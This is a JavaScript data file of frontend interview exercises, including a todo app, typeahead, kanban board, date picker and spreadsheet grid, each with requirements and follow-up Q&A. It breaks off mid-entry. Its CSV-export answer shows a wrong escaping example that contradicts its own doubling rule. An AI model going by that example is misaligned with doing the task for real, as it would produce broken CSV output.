// All 45 Machine Coding questions from the skill development spreadsheet.
// Each has: description, requirements, design patterns (BE), evaluation criteria,
// cross-questions (follow-ups interviewers commonly ask) with answers.

const FE_MC = [
  {
    n: "Todo App with Filters", track: "fe", d: "Easy", t: "45 min",
    r: "CRUD, filters (all/active/done), localStorage, bulk actions, edit inline",
    eval: "State management, clean code, edge cases",
    c: "Swiggy, Paytm, PhonePe",
    desc: "Build a Todo app: add, toggle, edit inline, delete, filter (All/Active/Completed), clear completed, persist in localStorage.",
    requirements: [
      "Add todo via input + Enter",
      "Toggle complete (checkbox)",
      "Edit inline on double-click, save on blur or Enter, cancel on Escape",
      "Delete with confirm",
      "Filter tabs: All / Active / Completed",
      "Clear completed button",
      "Counts: X items remaining",
      "Persist all state in localStorage",
    ],
    crossQA: [
      { q: "How do you prevent XSS from user-input todo text?",
        a: "React auto-escapes via `{value}`. Never use `dangerouslySetInnerHTML` with user data. If you must render markdown, sanitize with DOMPurify." },
      { q: "What if localStorage is disabled (Safari private mode)?",
        a: "Wrap read/write in try/catch. Fall back to in-memory state. Show a subtle notice that data won't persist." },
      { q: "How would you add sync across tabs?",
        a: "Listen to `storage` event on window. Or use BroadcastChannel API for richer messaging." },
      { q: "What if you have 10,000 todos?",
        a: "Virtualize the list (react-virtual). Debounce filter input. Paginate or infinite-scroll. Consider IndexedDB instead of localStorage (4MB limit)." },
      { q: "How do you ensure accessibility?",
        a: "Use semantic `<ul>/<li>`. Add `aria-label` to icon buttons. Checkbox should be a real `<input type='checkbox'>`. Announce count changes via `aria-live`." },
    ],
  },
  {
    n: "Autocomplete / Typeahead", track: "fe", d: "Medium", t: "60 min",
    r: "Debounced API calls, keyboard nav, highlight match, cache results, loading state",
    eval: "Performance, UX, accessibility, debounce",
    c: "Google, Flipkart, Amazon",
    desc: "Search suggestions dropdown. Debounced API, cached results, keyboard navigation, match highlighting, accessible ARIA combobox pattern.",
    requirements: [
      "Input fires debounced fetch (~300ms)",
      "AbortController cancels stale requests when user types again",
      "Cache results per query (Map)",
      "Keyboard: Up/Down navigate, Enter select, Esc close",
      "Highlight matching substring in each suggestion",
      "Loading state, empty state, error state",
      "Click outside to close",
      "ARIA: combobox, listbox, option, aria-activedescendant",
    ],
    crossQA: [
      { q: "Why debounce and not throttle?",
        a: "Debounce fires AFTER user stops typing — ideal for search since intermediate keystrokes aren't interesting. Throttle fires during typing — wasteful here." },
      { q: "What about race conditions on slow networks?",
        a: "AbortController cancels in-flight requests, or check the request ID matches current query before setState. Otherwise an older slow response could overwrite newer results." },
      { q: "How would you handle offline?",
        a: "Show cached results with an 'offline' indicator. Use Service Worker cache for common queries. Queue searches via Background Sync API." },
      { q: "What's the right debounce delay?",
        a: "200-300ms. <200 fires too often, >400 feels laggy. A/B test. Reduce delay on trusted fast connections (Network Information API)." },
      { q: "How to make it accessible?",
        a: "Wrapper role='combobox', aria-expanded, aria-controls pointing to listbox. Listbox role='listbox'. Each option role='option' with id. Input's aria-activedescendant = current option id." },
    ],
  },
  {
    n: "Star Rating Component", track: "fe", d: "Easy", t: "30 min",
    r: "Click to rate, hover preview, half stars, disabled state, controlled/uncontrolled",
    eval: "Reusability, props design, CSS",
    c: "CRED, Meesho, Razorpay",
    desc: "Rating input (1-5 stars). Click to set, hover for preview, support half-stars, keyboard accessible, works as controlled or uncontrolled component.",
    requirements: [
      "5 stars (configurable max)",
      "Click to set rating",
      "Hover preview (highlight up to hovered)",
      "Half-star support",
      "Disabled / readOnly state",
      "Controlled (`value`+`onChange`) AND uncontrolled (`defaultValue`)",
      "Keyboard: arrow keys to change, Enter to confirm",
      "Accessible: role='radiogroup', each star role='radio'",
    ],
    crossQA: [
      { q: "Controlled vs uncontrolled — when would you use each?",
        a: "Uncontrolled for simple forms (DOM holds state; use ref to read). Controlled when value drives other UI, needs validation, or submits via state. Our API supports both: if `value` prop provided → controlled; else → internal state with `defaultValue`." },
      { q: "How do you implement half-star click?",
        a: "Each star div has two halves (pseudo-elements or overlaid divs). Left half = rating = n-0.5, right half = n. Use mouse position within star or clip-path." },
      { q: "Keyboard accessibility?",
        a: "Radiogroup semantics. Tab enters group (focuses current), arrow keys change. Space/Enter confirms. Label via aria-label." },
      { q: "How does hover preview work without updating state?",
        a: "Local 'hoveredValue' state only for visual. Click commits to real value. On mouseleave, hoveredValue = null." },
    ],
  },
  {
    n: "Infinite Scroll Feed", track: "fe", d: "Medium", t: "60 min",
    r: "Paginated fetch, loading indicator, IntersectionObserver, scroll position restore",
    eval: "Performance, memory, API handling",
    c: "Flipkart, Swiggy, Zomato",
    desc: "Feed that auto-loads more items when user nears the bottom. IntersectionObserver, error + retry, end-of-list indicator, virtualize for 10k+ items.",
    requirements: [
      "Fetches 20 items per page",
      "IntersectionObserver on sentinel at bottom",
      "Loading spinner during fetch",
      "Error state with retry button",
      "Empty state",
      "End-of-list indicator when exhausted",
      "Scroll position restored on back navigation",
      "(Bonus) Virtualize for very long lists",
    ],
    crossQA: [
      { q: "Why IntersectionObserver over scroll event?",
        a: "Scroll fires constantly (every frame) — need throttling. IntersectionObserver is browser-optimized, fires only when intersection changes. Cleaner, faster, passive." },
      { q: "What's rootMargin used for?",
        a: "Expands observer's viewport. Setting '200px' bottom triggers load BEFORE user reaches bottom — smoother UX." },
      { q: "How to handle scroll position restoration?",
        a: "Save scroll offset + loaded items in sessionStorage before navigation. On mount, restore scroll after items are rendered. Or use history state's own scroll restoration." },
      { q: "What if items change height dynamically?",
        a: "Virtualizer needs correct estimateSize. For unknown heights, use ResizeObserver per row and update cache. react-virtual handles this." },
      { q: "How do you deduplicate items if the API re-sends them?",
        a: "Track seen IDs in a Set. Filter incoming. Or use normalized state with Map keyed by id." },
    ],
  },
  {
    n: "Multi-step Form Wizard", track: "fe", d: "Medium", t: "75 min",
    r: "Step navigation, validation per step, progress bar, state persistence, back/next",
    eval: "Form handling, UX, state management",
    c: "Razorpay, PhonePe, CRED",
    desc: "Multi-step form (e.g., checkout, onboarding). Next/Back navigation, per-step validation, progress indicator, state preserved across steps.",
    requirements: [
      "≥3 steps (e.g., Personal → Address → Payment → Review)",
      "Progress bar showing current step",
      "Validation runs on Next; blocks if invalid",
      "Back doesn't lose data",
      "Submit on last step — one payload with all fields",
      "Step labels clickable only if previous steps valid",
      "Skip optional steps",
    ],
    crossQA: [
      { q: "Where do you keep state — per-step local or one global?",
        a: "One global state object ({step, formData}). Per-step local would lose data on navigation. Use reducer or form library (react-hook-form, formik)." },
      { q: "How to validate?",
        a: "Schema per step (zod, yup). On Next, run schema.parse(currentStepData). If throws, show errors. Only advance if valid." },
      { q: "How to handle async validation (e.g., check email uniqueness)?",
        a: "Debounced async check on blur. Show spinner. Block Next while pending. Cancel on step change." },
      { q: "What about browser back button?",
        a: "Use URL search params for step (`?step=2`). Browser history respects it naturally. Or block with beforeunload if data would be lost." },
      { q: "How do you handle large forms with 10+ fields?",
        a: "React Hook Form — uncontrolled with refs, minimal re-renders. Lazy-validate. Split into logical sections." },
    ],
  },
  {
    n: "Kanban Board (Trello-like)", track: "fe", d: "Hard", t: "90 min",
    r: "Drag-drop cards between columns, add/edit/delete, reorder within column",
    eval: "DnD implementation, state shape, UX",
    c: "Atlassian, Flipkart, Swiggy",
    desc: "Trello-style board. Columns (Todo/Doing/Done). Drag cards between columns + reorder within. Add/edit/delete cards. Persist state.",
    requirements: [
      "Configurable columns",
      "Add card to any column",
      "Edit card inline (title, description)",
      "Delete with confirm",
      "Drag card to new position within column",
      "Drag card to different column",
      "Persist in localStorage",
      "Responsive (stack on mobile)",
    ],
    crossQA: [
      { q: "Why normalized state instead of nested?",
        a: "Nested: `columns: [{ id, title, cards: [...] }]`. Moving card = O(n) deep clone + splice in two places. Normalized: `{columns, cards}` — cards are flat map, columns hold cardIds. Moves are O(1). React renders faster." },
      { q: "Which DnD library would you pick?",
        a: "dnd-kit — modern, accessible, small bundle. react-beautiful-dnd is best UX but Atlassian-maintained fork. react-dnd is powerful but complex. HTML5 drag API alone has mobile + visual bugs." },
      { q: "How to preserve drag handle but prevent dragging on click?",
        a: "Use a specific handle ref. dnd-kit has `useDraggable` returning listeners you attach only to the handle. Click vs drag distinguished by movement threshold." },
      { q: "How to handle reordering with many cards efficiently?",
        a: "Use fractional indices (e.g., 1.0, 1.5, 2.0) instead of array indices. Inserting between two = avg of their indices. No re-indexing. Paper: 'Jumpy Collaborative Lists'." },
      { q: "How to make it collaborative?",
        a: "WebSocket + CRDT (Yjs) for conflict-free concurrent edits. Or OT for each operation. Broadcast moves via channel; clients apply to local state." },
    ],
  },
  {
    n: "Nested Comments / Reddit", track: "fe", d: "Medium", t: "75 min",
    r: "Nested replies, collapse/expand, upvote, add reply at any level, recursive render",
    eval: "Recursion, component design, state",
    c: "Amazon, Flipkart, Google",
    desc: "Reddit-style nested comment thread. Recursive replies, collapse/expand each thread, upvote/downvote, reply at any depth.",
    requirements: [
      "Recursive component renders children",
      "Collapse/expand toggle per comment",
      "Reply form appears inline on click",
      "Upvote/downvote updates count + color",
      "Deep nesting indent (cap visual depth at ~5, then reset indent)",
      "Sort threads by top/new",
      "Permalink (URL points to thread)",
    ],
    crossQA: [
      { q: "Flat array vs tree — which data structure?",
        a: "Flat with parentId refs is better. Adding/moving/deleting is O(1). Render-time build tree from array. Normalize to `Map<id, Comment>`." },
      { q: "How to prevent React render stack overflow on deep threads?",
        a: "Usually fine up to a few thousand nodes. For deeper, flatten render or virtualize. Some implementations render children lazily as user scrolls." },
      { q: "How to optimistically update votes?",
        a: "Immediately update local count + indicate 'pending'. If server errors, revert. Use React Query's `onMutate` + `onError` for clean rollback." },
      { q: "How to keyboard-navigate threads?",
        a: "J/K to move to next/prev sibling (or depth-first). H to collapse parent. Similar to Gmail. aria-level for screen readers." },
      { q: "How do you paginate when comments are huge?",
        a: "Top-N siblings per level. 'Show N more replies' button for the rest. Lazy-load on expand. Cursor-based API." },
    ],
  },
  {
    n: "Data Table with Sort/Filter", track: "fe", d: "Medium", t: "75 min",
    r: "Column sort (asc/desc), text filter, pagination, column resize, row selection",
    eval: "Performance with large data, UX, a11y",
    c: "Walmart, Atlassian, Razorpay",
    desc: "Enterprise table. Sort any column, per-column filter, pagination, row selection (single/range/all), column resize, CSV export, sticky header.",
    requirements: [
      "1000+ rows (virtualize if >200)",
      "Column sort: asc → desc → none on header click",
      "Per-column filter input in header",
      "Global search",
      "Pagination (10/25/50/100 per page)",
      "Column resize via header drag",
      "Row selection: checkbox, shift-click range, select-all-on-page, select-all",
      "Export selected to CSV",
      "Sticky header on scroll",
    ],
    crossQA: [
      { q: "How do you make sort + filter fast on 10k rows?",
        a: "`useMemo` to cache sorted/filtered result keyed by rows+sortKey+filter. Re-compute only when dependency changes. Debounce filter input 150ms. Virtualize rendered rows." },
      { q: "Shift-click range selection — how?",
        a: "Track last-clicked index. On shift-click, select all rows between lastIndex and current (inclusive). Without shift, single select." },
      { q: "How to handle column resize?",
        a: "Mouse down on header edge → set 'resizing' column. mousemove → update width. mouseup → commit. Persist widths in localStorage by column key." },
      { q: "CSV export — what about cells with commas/newlines?",
        a: "Wrap in double quotes. Escape internal quotes by doubling. `,\"hello, world\",` becomes `,\"hello,\" world\",`. Use library (papaparse) if complex." },
      { q: "How accessible is your table?",
        a: "`<table><thead><tbody>`, not div grid. scope='col' on th. aria-sort on sortable headers. Row selection via checkbox with aria-label. Keyboard nav between cells." },
    ],
  },
  {
    n: "Image Carousel / Slider", track: "fe", d: "Medium", t: "60 min",
    r: "Auto-play, manual nav, dot indicators, swipe support, lazy load images, infinite loop",
    eval: "Smooth transitions, touch events, perf",
    c: "Meesho, Myntra, Nykaa",
    desc: "Image carousel with auto-play, manual prev/next, dot indicators, touch swipe, lazy-loaded images, seamless infinite loop.",
    requirements: [
      "Prev/Next buttons",
      "Dot indicators (click to jump)",
      "Auto-play with pause on hover",
      "Touch swipe on mobile",
      "Keyboard: arrow keys",
      "Lazy load off-screen images",
      "Infinite loop (clone edges)",
      "Smooth transitions (CSS transform, not layout)",
    ],
    crossQA: [
      { q: "How do you implement infinite loop smoothly?",
        a: "Clone first slide at end, last at start. Slide normally. When reaching clone, jump back to real slide (disable transition for that frame). Smooth to the user." },
      { q: "Why animate transform instead of left/margin?",
        a: "transform uses GPU compositing — no layout, no paint. left/margin triggers layout for each frame, janky. Test with Chrome DevTools Performance tab." },
      { q: "How to handle swipe gestures?",
        a: "touchstart → record start X. touchmove → delta = current - start, apply transform in realtime. touchend → if delta > threshold, go to next/prev; else snap back. Distinguish swipe from scroll by angle." },
      { q: "Lazy loading images — native vs manual?",
        a: "`<img loading='lazy'>` works for in-DOM images. For carousel (all in DOM but most off-screen), use IntersectionObserver to set src only when about to show. Preload next slide." },
      { q: "Accessibility?",
        a: "aria-roledescription='carousel', aria-label. Each slide: aria-label='Slide 1 of 5'. Pause-on-focus for auto-play. Announce current slide via aria-live='polite'." },
    ],
  },
  {
    n: "Modal / Dialog Component", track: "fe", d: "Easy", t: "45 min",
    r: "Open/close, overlay click dismiss, Escape key, focus trap, portal rendering, animation",
    eval: "Accessibility, focus management, portal",
    c: "Very frequently asked",
    desc: "Accessible modal component. Focus trap, ARIA dialog, portal rendering, body scroll lock, animated open/close.",
    requirements: [
      "Open/close controlled by prop",
      "Close on: X button, Esc key, overlay click (configurable)",
      "Focus moves into modal on open, returns to trigger on close",
      "Focus trapped within modal (Tab cycles)",
      "Rendered via React Portal",
      "Animated (fade + scale)",
      "role='dialog', aria-modal='true', aria-labelledby",
      "Prevent body scroll while open",
    ],
    crossQA: [
      { q: "Why Portal?",
        a: "Without portal, modal is child of trigger. Trigger's overflow:hidden or stacking context can hide/distort modal. Portal renders into body — escapes parent CSS." },
      { q: "How does focus trap work?",
        a: "On Tab at last focusable element → jump to first. Shift+Tab at first → jump to last. Query focusable elements on open. Handle dynamic content changes." },
      { q: "What if multiple modals open?",
        a: "Stack — higher z-index on latest. Only top modal traps focus. Esc closes top one. Discouraged pattern (confusing UX) but technically possible." },
      { q: "How do you prevent body scroll?",
        a: "On open: `document.body.style.overflow = 'hidden'`. On close: restore. Beware of layout shift from missing scrollbar — pad right by scrollbar width." },
      { q: "What about screen readers?",
        a: "role='dialog', aria-modal='true'. aria-labelledby pointing to modal title. Initial focus on close button or first input. Readers announce as a dialog entering focus." },
    ],
  },
  {
    n: "File Explorer (Tree View)", track: "fe", d: "Hard", t: "90 min",
    r: "Recursive folder tree, expand/collapse, create file/folder, rename, delete, context menu",
    eval: "Recursion, tree state, keyboard nav",
    c: "Google, Flipkart, Amazon",
    desc: "VSCode-like file explorer. Tree of folders/files, expand/collapse, create/rename/delete, right-click context menu, drag-drop to move, keyboard nav.",
    requirements: [
      "Recursive tree render",
      "Click folder to expand/collapse",
      "Arrow icons + indent per depth",
      "Right-click context menu (New, Rename, Delete)",
      "Inline rename on F2 or double-click",
      "Delete with confirm",
      "Drag to move files/folders",
      "Keyboard: Up/Down to navigate, Right/Left to expand/collapse, Enter to open",
      "Search files by name (filter)",
    ],
    crossQA: [
      { q: "Nested vs normalized tree — which?",
        a: "Normalized map: `Map<id, Node>` with children as array of IDs. Operations (rename, delete, move) are O(1). Render uses recursive lookup. Nested structure is O(depth) for updates and causes re-render cascades." },
      { q: "How to implement drag-drop to move?",
        a: "On drop, validate: can't drop parent into its own descendant. Update moved item's parentId. Remove from old parent's children, add to new parent's." },
      { q: "How to keyboard-navigate?",
        a: "Maintain 'focused' node id. Flatten visible tree (respecting collapsed state) into array. Up/Down = prev/next in flat array. Right = expand or move to first child. Left = collapse or move to parent." },
      { q: "What if tree has 100k nodes?",
        a: "Virtualize — only render visible rows. Flat list of visible nodes. react-virtual. Lazy-load children on expand (don't preload entire tree)." },
      { q: "How to handle in-progress operations (creating, renaming)?",
        a: "Add 'editing' flag to node. Render input in place. Commit on blur/enter, cancel on Escape. Show spinner if async." },
    ],
  },
  {
    n: "Shopping Cart", track: "fe", d: "Medium", t: "60 min",
    r: "Add/remove items, quantity +/-, price calc, coupon code, empty state, persist cart",
    eval: "State management, calculations, UX",
    c: "Swiggy, Zomato, Myntra",
    desc: "Full shopping cart: add/remove items, quantity +/-, live price calc with tax and discounts, coupon code with validation, persisted state.",
    requirements: [
      "Add item (merge if already in cart)",
      "Remove item with confirm",
      "Increment / decrement quantity (1..stock)",
      "Live subtotal + tax + discount + total",
      "Apply/remove coupon codes",
      "Empty cart state",
      "Persist in localStorage",
      "Bulk clear",
      "Accessible + mobile-responsive",
    ],
    crossQA: [
      { q: "Where do totals live — in state or derived?",
        a: "Derived via useMemo. Never store — source of truth is items + coupon. Derived values can't get out of sync." },
      { q: "How to validate coupons?",
        a: "Client sends code to server → server validates + returns discount info. Never trust client-computed discount. Client shows preview, server is authority." },
      { q: "What if item goes out of stock while in cart?",
        a: "On checkout, server validates stock. If any item unavailable, return error with details. UI shows the item with a warning, adjusts or removes it." },
      { q: "How to handle pricing precision?",
        a: "Store prices as integers (cents/paise). Use libraries like dinero.js for arithmetic. Never float math on money — 0.1 + 0.2 ≠ 0.3." },
    ],
  },
  {
    n: "Accordion / FAQ", track: "fe", d: "Easy", t: "30 min",
    r: "Single/multi expand, animated open/close, keyboard accessible, nested accordions",
    eval: "a11y, animation, component API design",
    c: "Warm-up round question",
    desc: "Accordion component. Single-expand (only one at a time) or multi-expand mode. Animated open/close. Fully keyboard-accessible.",
    requirements: [
      "Items with header + body",
      "Click header to toggle",
      "Mode: single (radio-like) or multi (checkbox-like)",
      "Animated expand (height transition or css grid trick)",
      "Arrow icon rotates",
      "Keyboard: Enter/Space toggles, Home/End for first/last item",
      "aria-expanded, aria-controls",
    ],
    crossQA: [
      { q: "How do you animate height: auto?",
        a: "Can't transition from fixed to auto. Use max-height with large value, or measure real height with ResizeObserver and set pixel height. Modern: use CSS Grid with `grid-template-rows: 0fr → 1fr`." },
      { q: "Controlled vs uncontrolled API?",
        a: "Support both. Pass `expanded` array (controlled) OR `defaultExpanded`. Call `onChange` on toggle. Lets user build custom logic (expand-on-hover, URL-synced, etc.)." },
      { q: "How to handle nested accordions?",
        a: "Same component recursively. Propagate events so clicking nested header doesn't bubble to outer (stopPropagation). Test keyboard nav — Home/End scopes to current level." },
      { q: "Accessibility?",
        a: "Headers as buttons (not divs). aria-expanded=true/false. aria-controls points to body id. Body aria-labelledby points back to header. role='region' optional for bodies." },
    ],
  },
  {
    n: "Calendar / Date Picker", track: "fe", d: "Hard", t: "90 min",
    r: "Month navigation, date selection, range selection, disabled dates, today highlight",
    eval: "Date logic, grid layout, edge cases",
    c: "Google, Microsoft, Razorpay",
    desc: "Date picker with month grid. Prev/next month, single + range selection, disabled dates (min/max), today highlighted, keyboard navigation.",
    requirements: [
      "Month grid (42 cells: leading/trailing days grayed)",
      "Click date → select (single mode)",
      "Click two dates → select range (range mode)",
      "Hover preview during range selection",
      "Disabled dates (outside min/max or specific disabled list)",
      "Today highlighted",
      "Prev/Next month buttons + month/year dropdown",
      "Keyboard: Arrow keys move, Enter selects, Page Up/Down = month change",
      "Localization (locale for day names, first day of week)",
    ],
    crossQA: [
      { q: "How do you handle timezones?",
        a: "Store dates as ISO strings at midnight UTC, or as plain date values (YYYY-MM-DD, no time). Never store localized Date objects — 'Jan 1 2024' in IST ≠ in UTC. Use date-fns or Temporal API." },
      { q: "DST gotchas?",
        a: "Adding a day via setDate/setHours can be off by 1 hour around DST boundaries. Use date-fns addDays — it handles correctly. Or work with UTC and convert only for display." },
      { q: "How to generate month grid efficiently?",
        a: "Get first day of month. Get its day-of-week (0=Sun). Compute start: first day - that offset. Generate 42 consecutive days. Mark current-month vs adjacent." },
      { q: "Locale first-day-of-week (Mon in Europe, Sun in US)?",
        a: "Intl.Locale has weekInfo with firstDay. Or accept prop from caller. Reorder weekday headers + grid start accordingly." },
      { q: "What if data is in the year 2100?",
        a: "Most date libs handle up to ~year 275k. Test with extremes. Native Date is fine. String formats should sort correctly (YYYY-MM-DD)." },
    ],
  },
  {
    n: "Spreadsheet-like Grid", track: "fe", d: "Hard", t: "90 min",
    r: "Editable cells, formula support (=A1+B1), cell references, row/col headers, selection",
    eval: "Formula parsing, cell dependency graph",
    c: "Google, Flipkart (SDE-2+)",
    desc: "Mini-Excel. Editable cells, formula support (=SUM(A1:A10), =A1+B1), cell references, auto-recalc on dependency change, row/col headers, multi-cell selection.",
    requirements: [
      "100x26 grid (A1..Z100)",
      "Click cell to select; double-click or F2 to edit",
      "Formula starts with `=`",
      "Supported: cell refs (A1), ranges (A1:B10), ops (+-*/), fns (SUM, AVG, MIN, MAX)",
      "Dependency graph — updating A1 auto-updates dependent cells",
      "Detect circular references (A1 = B1, B1 = A1)",
      "Multi-select: click-drag, shift-click, Ctrl-click",
      "Copy/paste with preserve formulas",
      "Row/col headers sticky",
    ],
    crossQA: [
      { q: "How do you parse formulas?",
        a: "Two approaches: (1) Build lexer + recursive-descent parser → AST. Evaluate AST. (2) Use expression parser library (math.js, expr-eval). For an interview: (1) shows depth, (2) is practical." },
      { q: "How does dependency graph work?",
        a: "For each formula cell, extract referenced cells. Build dependents map: cell → [cells that depend on it]. On cell change, walk dependents BFS/DFS, re-evaluate each. Topological sort for correctness." },
      { q: "How to detect circular refs?",
        a: "DFS during recalc with visited + current-path sets. If cell in current path, circular. Show #CIRCULAR! error. OR check at graph-build time." },
      { q: "Performance with 10k cells?",
        a: "Virtualize rendering (only cells in viewport). Recalc only dirty cells (minimal cut of dependents). Debounce recalc during rapid typing." },
      { q: "What about formula autocomplete like real Excel?",
        a: "Track current token while typing. Show fn list (SUM, AVG...) or current cell range suggestions based on context. Similar to code editor autocomplete." },
    ],
  },
  {
    n: "Tic-Tac-Toe (with AI)", track: "fe", d: "Medium", t: "60 min",
    r: "2 player + AI mode, win detection, minimax algorithm, reset, score tracking",
    eval: "Game logic, minimax, clean state",
    c: "Amazon, Walmart, PhonePe",
    desc: "Tic-tac-toe with 2-player mode + vs-AI mode using minimax. Win detection, draw detection, score tracker across games, reset.",
    requirements: [
      "3x3 board",
      "2-player mode (take turns)",
      "AI mode (player vs computer)",
      "Win detection (rows, cols, diagonals)",
      "Draw detection",
      "Minimax for AI",
      "Score tracking (X wins, O wins, draws)",
      "Reset button",
      "Highlight winning line",
    ],
    crossQA: [
      { q: "How does minimax work?",
        a: "Recursive: for each possible move, simulate the move and call minimax on the resulting board (switching player). Maximize for 'me', minimize for opponent. Base cases: win (+10), loss (-10), draw (0). Return best score (and move)." },
      { q: "Optimization — alpha-beta pruning?",
        a: "Prune branches that can't improve current best. Track alpha (best so far for maximizer), beta (best for minimizer). If beta ≤ alpha, stop exploring this branch. Cuts search ~by half." },
      { q: "How to make AI 'beatable'?",
        a: "Add difficulty: easy = random move; medium = random X%, minimax rest; hard = full minimax. Or limit minimax depth. Or add noise to scores." },
      { q: "What if we extend to 4x4 or NxN?",
        a: "Board size configurable. Win = N in a row/col/diagonal. Minimax explodes — for 4x4 use limited depth + heuristic evaluation. For NxN need Monte Carlo Tree Search or deep learning (AlphaZero-style)." },
      { q: "How to test game logic?",
        a: "Unit test: win detection for all 8 winning lines. Test draws. Test AI always picks optimal (doesn't lose from winnable positions). Fuzz-test random games never crash." },
    ],
  },
  {
    n: "Poll / Voting Widget", track: "fe", d: "Easy", t: "45 min",
    r: "Create poll, vote, results bar chart, real-time update simulation, prevent double vote",
    eval: "State management, visual feedback",
    c: "CRED, Meesho",
    desc: "Create a poll with multiple options. Users vote once, see live results as bar chart with percentages.",
    requirements: [
      "Create poll: question + 2-10 options",
      "Vote by clicking option",
      "Show results: bar + percentage + vote count",
      "Prevent double vote (per-user via localStorage id)",
      "Real-time updates (simulated via polling or WebSocket)",
      "Show total votes",
      "Animated bar fill",
    ],
    crossQA: [
      { q: "How to prevent double voting?",
        a: "Client: store poll+userId combo in localStorage after vote. Server: check userId (or IP if anonymous) against voted list. Client-only check can be bypassed via devtools — server is authoritative." },
      { q: "How to simulate real-time updates?",
        a: "Polling: fetch every 5s. Better: SSE or WebSocket. Or Firebase/Pusher for turnkey. Show 'updated Xs ago'." },
      { q: "What if someone creates 1000 options?",
        a: "Validate at creation: min 2, max 10 options. Per-option char limit. Prevent DoS via rate limiting." },
      { q: "Accessibility?",
        a: "Each option as a radio button in a fieldset. aria-label on chart bars. Announce result changes via aria-live='polite'." },
    ],
  },
  {
    n: "Transfer List (Dual Listbox)", track: "fe", d: "Medium", t: "60 min",
    r: "Two lists, select items, move left/right, move all, search filter, disabled items",
    eval: "Bulk operations, UX, state handling",
    c: "Atlassian, Flipkart",
    desc: "Two side-by-side lists (Available / Selected). Move items between via buttons. Multi-select, search, move-all.",
    requirements: [
      "Left list (available) + Right list (selected)",
      "Select multiple items (click, shift-click range, Ctrl-click toggle)",
      "Move selected: → to selected, ← to available",
      "Move all: ⇒ / ⇐ buttons",
      "Search input above each list filters",
      "Disabled items can't be moved",
      "Sort by name option",
      "Counts per side",
    ],
    crossQA: [
      { q: "How do you store state?",
        a: "Single array of { id, label, side: 'available'|'selected', selected: bool, disabled: bool }. Filter by side for render. Or two arrays with a map from id for lookup." },
      { q: "How to implement shift-range select?",
        a: "Track `lastClickIndex`. On shift-click at index i, select all indices between lastClickIndex and i. Reset on plain click." },
      { q: "Keyboard accessibility?",
        a: "List role='listbox' aria-multiselectable='true'. Items role='option' with aria-selected. Shift+arrows to extend selection. Enter or dedicated key (Alt+→) to move." },
    ],
  },
  {
    n: "Progress Bar / Loader", track: "fe", d: "Easy", t: "30 min",
    r: "Animated progress, queue multiple bars, sequential fill, pause/resume",
    eval: "CSS animations, async control flow",
    c: "Google, Uber, CRED",
    desc: "Progress bar component. Animated fill 0-100%. Can queue multiple bars that fill in sequence. Pause/resume.",
    requirements: [
      "Value 0-100 prop",
      "Animated fill (CSS transition)",
      "Queue: stack multiple bars, each fills in sequence",
      "Pause/resume all",
      "Reset",
      "Customizable color, duration",
      "Indeterminate mode (stripes)",
    ],
    crossQA: [
      { q: "How to sequence fills?",
        a: "Queue array of {duration}. Start first. On transitionend event, trigger next. OR use CSS @keyframes with animation-delay per bar. OR use state machine (idle→running→paused→done)." },
      { q: "How does pause work?",
        a: "animation-play-state: paused (CSS). Or track elapsed time, on pause freeze transform at current %, on resume continue with remaining duration." },
      { q: "Performance — animate width vs transform?",
        a: "transform: scaleX(n) — GPU-accelerated, no layout. Width triggers layout on every frame. Always prefer transform for animations." },
    ],
  },
  {
    n: "OTP Input Component", track: "fe", d: "Easy", t: "30 min",
    r: "Auto-focus next input, backspace behavior, paste support, timer, resend OTP",
    eval: "UX polish, input management, edge cases",
    c: "PhonePe, Razorpay, Paytm",
    desc: "OTP entry: N separate boxes, auto-advance on type, backspace goes back, paste distributes across boxes, resend timer.",
    requirements: [
      "N boxes (e.g., 6)",
      "Type digit → auto-focus next",
      "Backspace on empty → clear + focus prev",
      "Paste full OTP → distributes to boxes",
      "Only digits (inputMode='numeric')",
      "Timer: 30s before 'Resend' becomes clickable",
      "On last box filled → fire onComplete",
      "Accessible (aria-label per box)",
    ],
    crossQA: [
      { q: "How to handle paste?",
        a: "onPaste event → e.clipboardData.getData('text'). Filter digits only. Distribute across inputs from current focus. Focus last filled box." },
      { q: "Why inputMode='numeric' not type='number'?",
        a: "type='number' shows spinner arrows, allows 'e' / decimals, doesn't force numeric keyboard on all mobile. inputMode='numeric' + pattern='[0-9]*' = correct keyboard + validation." },
      { q: "Auto-submit pros/cons?",
        a: "Pro: seamless. Con: if user pastes wrong, no chance to review. Best: enable submit button on full fill, user clicks. OR auto-submit with 500ms delay for review." },
    ],
  },
  {
    n: "Chip / Tag Input", track: "fe", d: "Medium", t: "45 min",
    r: "Type to add, click to remove, backspace to delete last, autocomplete suggestions",
    eval: "Input handling, keyboard events, UX",
    c: "Swiggy, Flipkart, CRED",
    desc: "Tag/chip input like email 'To' field or Stack Overflow tags. Type + Enter/comma to add, X to remove, backspace to delete last.",
    requirements: [
      "Enter or comma adds current input as chip",
      "Click X on chip to remove",
      "Backspace on empty input deletes last chip",
      "Paste comma-separated list → multiple chips",
      "Max chips limit (optional)",
      "Validation (email format, no duplicates)",
      "Autocomplete suggestions",
      "Chips themselves focusable (Left/Right arrow)",
    ],
    crossQA: [
      { q: "How to prevent duplicates?",
        a: "Keep Set of chip values. On add, check `if (chips.has(val)) showError()`. Case-insensitive compare for emails." },
      { q: "Email validation — how strict?",
        a: "Don't write your own regex — use browser's `<input type='email'>` validity, or a battle-tested library. RFC 5322 emails are weird ('a@b' is valid)." },
      { q: "How to handle very long tags?",
        a: "CSS: max-width per chip + text-overflow: ellipsis. Or tooltip with full text. Warn user if tag over N chars." },
    ],
  },
  {
    n: "Countdown Timer", track: "fe", d: "Easy", t: "30 min",
    r: "Start/pause/reset, lap times, input custom time, visual feedback, alarm",
    eval: "setInterval management, state, UX",
    c: "Frequently asked warm-up",
    desc: "Countdown timer: start/pause/reset, input custom time (HH:MM:SS or minutes), lap times, visual progress, alarm when complete.",
    requirements: [
      "Input: custom time",
      "Start, Pause, Reset buttons",
      "Display HH:MM:SS",
      "Visual progress (ring or bar)",
      "Lap times (record current time, keep list)",
      "Alarm sound + flash when hits 0",
      "Background keeps accurate (use Date.now(), not interval count)",
    ],
    crossQA: [
      { q: "Why not count down by 1s each setInterval tick?",
        a: "setInterval isn't guaranteed to fire every 1s (browser throttles backgrounded tabs, system load). Instead: record start time + duration. On each tick, remaining = duration - (Date.now() - start). Accurate even if ticks miss." },
      { q: "How to handle tab switching / browser background?",
        a: "Background tabs: setInterval throttles to 1/sec (or more). Still works if using Date.now(). For Web Workers: they don't throttle — use one for critical timers." },
      { q: "Alarm — how to play sound?",
